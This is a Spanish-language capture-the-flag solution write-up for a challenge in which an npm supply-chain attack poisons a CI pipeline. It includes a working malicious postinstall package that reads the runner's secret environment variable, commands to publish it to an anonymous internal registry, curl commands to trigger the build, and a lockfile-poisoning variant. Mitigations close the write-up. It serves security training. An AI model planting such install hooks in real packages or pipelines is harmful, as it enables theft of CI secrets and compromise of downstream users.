# Solución — pwn-supply-04 · Poisoned Pipeline

**Categoría:** pwn · **Dificultad:** insane · **Puntos:** 700
**Vuln central:** Ataque de **cadena de suministro** — ejecución de **lifecycle scripts** de npm (`postinstall`) en un CI runner sin sandbox → RCE → exfiltración del secreto de CI (la flag) en el log del build.

---

## Historia

**Forgewright** es un vendor de software. Vende una librería interna,
`@forge/logger`, y opera un CI ("forge-runner") que reconstruye builds de sus
clientes: el cliente sube un `package.json` (y opcionalmente un
`package-lock.json`) y el runner ejecuta `npm install` contra el **registro npm
INTERNO** del vendor para validar que las librerías del scope `@forge` cargan.

El error de Forgewright es el mismo que tumbó a empresas reales:

- **SolarWinds (2020):** el pipeline de build fue comprometido y firmó binarios
  troyanizados que se distribuyeron a 18.000 clientes. La lección: *el CI es el
  punto de mayor confianza y privilegio; comprometerlo es comprometerlo todo.*
- **event-stream (2018):** un mantenedor añadió una dependencia maliciosa cuyo
  código corría en `install`/runtime y robaba wallets. *El código de una
  dependencia se ejecuta con tus privilegios.*
- **codecov (2021):** un script de CI alterado exfiltró variables de entorno
  (tokens/secretos) de los pipelines de miles de proyectos. *Los secretos viven
  en el entorno del runner.*
- **ua-parser-js (2021):** versiones publicadas con un `preinstall` malicioso que
  ejecutaba un cryptominer/stealer **en el momento de `npm install`**. *El vector
  es el lifecycle script, no el `require`.*

Aquí reproducimos exactamente esa clase de ataque: el registro interno permite
**publicar sin firma ni revisión** y el runner corre `npm install` **sin
`--ignore-scripts`**. Quien controle un paquete del scope `@forge` ejecuta
código arbitrario dentro del CI.

---

## Topología

```
jugador (VPN)
   ├──> forge-runner   172.30.N.43:8080   POST /build  (corre `npm install`)
   └──> registry       172.30.N.44:8080   npm interno, PUBLISH ANÓNIMO
```

La `FLAG` se inyecta como **secreto de CI** sólo en el entorno del `forge-runner`
(env `FLAG`). No se expone por HTTP: hay que **ejecutar código dentro del runner**
para leerla.

---

## Vulnerabilidad (por qué funciona)

1. **Registro interno autoritativo para `@forge` + publish anónimo.** El runner
   escribe un `.npmrc` con `@forge:registry=http://registry:8080/`. El registro
   acepta `npm publish` sin validar token → cualquiera publica una versión nueva
   de `@forge/logger`.
2. **`npm install` SIN `--ignore-scripts`.** El runner ejecuta el ciclo de vida
   estándar de npm. Si una dependencia define `postinstall`/`preinstall`/`install`,
   ese código **se ejecuta durante el build**, en el runner, con `process.env.FLAG`
   disponible.
3. **`--foreground-scripts`.** El runner captura el stdout/stderr de los scripts
   en el log del build (para visibilidad de builds nativos) → la salida del
   `postinstall` malicioso aparece en el log que el runner **devuelve al cliente**.
   Ese es el canal de exfiltración (no hace falta egress de red, lo cual encaja
   con el aislamiento por equipos del CTF).

> Detalle técnico clave (INSANE): por defecto `npm install` **NO** muestra el
> stdout de los lifecycle scripts; sólo lo hace con `--foreground-scripts` (o
> `--loglevel silly`). El runner lo activa, así que el jugador debe darse cuenta
> de que el canal de salida es el **log del propio build**, no una respuesta HTTP
> directa.

---

## Reconocimiento

1. `GET /` describe el pipeline:
   ```
   npm install --registry http://registry:8080
   @forge es autoritativo en el registro interno; el registro permite publicar sin firma.
   No usamos --ignore-scripts.
   ```
   Tres pistas: scope interno, publish sin firma, scripts habilitados.
2. `GET /registry` → confirma la URL del registro interno y el scope `@forge`.
3. El registro (`.44:8080`) es alcanzable por el jugador: `GET /@forge/logger`
   muestra la versión baseline `1.0.0`.

---

## Explotación (paso a paso)

### 1) Armar el paquete malicioso

`solution/exploit/forge-telemetry/` es un `@forge/logger@9.9.9` (versión **mayor**
que la baseline) con un **`postinstall`**:

```json
// package.json
{ "name": "@forge/logger", "version": "9.9.9",
  "scripts": { "postinstall": "node postinstall.js" } }
```

```js
// postinstall.js — corre en el runner, con el entorno del CI
const flag = process.env.FLAG || "(sin FLAG)";
console.log("=== FORGE-PWNED postinstall ejecutado en el runner ===");
console.log("CI_SECRET_FLAG=" + flag);
```

### 2) Publicar en el registro interno (anónimo)

```sh
cd solution/exploit/forge-telemetry
cat > .npmrc <<EOF
//<host>:8080/:_authToken=anon
registry=http://<host>:8080/
@forge:registry=http://<host>:8080/
EOF
npm publish --registry http://<host>:8080/    # host = registry, p.ej. 172.30.N.44:8080
```

### 3) Disparar el build

El `package.json` del cliente declara la dependencia con un rango que captura la
9.9.9:

```sh
curl -s -X POST http://<forge>:8080/build \
  -H 'Content-Type: application/json' \
  -d '{"package.json":{"name":"customer-build","version":"1.0.0","dependencies":{"@forge/logger":"^9.0.0"}}}'
```

El runner resuelve `@forge/logger@9.9.9` desde el registro interno → `npm install`
ejecuta el `postinstall` → la flag se imprime en el log.

### 4) Leer la flag

```sh
# directamente de la respuesta del build, o:
curl -s http://<forge>:8080/build/<id> | grep -oE 'flag\{[^}]*\}'
```

**Todo automatizado en `solution/exploit/pwn.sh <forge_host> <registry_host>`.**
Salida verificada (FLAG de prueba `flag{poisoned_pipeline_TEST}`):

```
[2] disparando build...
log: "> @forge/logger@9.9.9 postinstall\n> node postinstall.js\n
      === FORGE-PWNED postinstall ejecutado en el runner ===
      CI_SECRET_FLAG=flag{poisoned_pipeline_TEST}"
[3] flag: flag{poisoned_pipeline_TEST}
```

### Vector alternativo (lockfile manipulado)

En vez de depender de la resolución por semver, el jugador puede enviar un
`package-lock.json` que **fije** la versión/tarball maliciosa (incluso pinneando
el `resolved` y el `integrity` calculados al publicar). El runner escribe ese
lockfile y `npm install` lo honra → mismo resultado. Esto modela el caso real de
*lockfile poisoning*, donde un PR aparentemente inocente cambia sólo el lockfile.

---

## Por qué es INSANE

- No es un bug web clásico (SQLi/XSS): hay que **entender el flujo de un CI** y
  dónde se ejecuta el código de las dependencias.
- El secreto vive en el **runner**, no en el endpoint HTTP: no se puede leer
  directo; hay que lograr **ejecución durante el `npm install`**.
- El jugador debe descubrir que (a) el scope `@forge` es controlable vía publish
  anónimo, (b) los lifecycle scripts corren, y (c) el **canal de salida es el log
  del build** (porque el runner usa `--foreground-scripts`). Cada pieza es un
  salto conceptual.
- Distinto de `web-supply-01`: allí era *dependency confusion* sobre PyPI con
  exfiltración vía `import` (código a nivel de módulo). Aquí el vector es el
  **lifecycle/install script de npm** y/o un **lockfile manipulado**, y el código
  corre en **tiempo de instalación**.

---

## Mitigaciones (didáctico)

- `npm install --ignore-scripts` en el CI (o `npm ci --ignore-scripts`).
- Registro interno con **autenticación + firma** y *namespace/scope pinning*;
  prohibir publish anónimo.
- `npm ci` con `package-lock.json` **revisado** y `--require-hashes`/integrity
  fijada; tratar cambios de lockfile como cambios de código (revisión obligatoria).
- Ejecutar el `install` en un **sandbox real** sin acceso a secretos (los secretos
  de CI no deben estar en el entorno del `npm install`).
- Allowlist de paquetes/versiones; escaneo de dependencias (Socket, OSV, etc.).

---

## Nota anti-cheat

La flag es **dinámica y única por equipo** (HMAC del flag-service,
`ARCHITECTURE §4`), inyectada por env `FLAG` sólo en el `forge-runner` de **esta**
instancia. Compartir la técnica no entrega puntos: cada equipo debe publicar en
**su** registro y disparar **su** build para leer **su** flag en **su** log.
Enviar la flag de otro equipo dispara `cheat_flag_share` vía `POST /whose-flag`.

Además, el `forge-runner` emite un evento SIEM `scan_detected` / `alert` al
collector cuando un build resuelve una versión **no-baseline** de `@forge/logger`
o cuando el log evidencia la ejecución de un lifecycle script (`postinstall`/
`preinstall`). El registro loguea cada `publish` con la línea `CTFREG`, y el
runner loguea cada petición completa con la línea `CTFREQ` (consumida por
Promtail/Loki y narrada anonimizada por el caster-overlay).
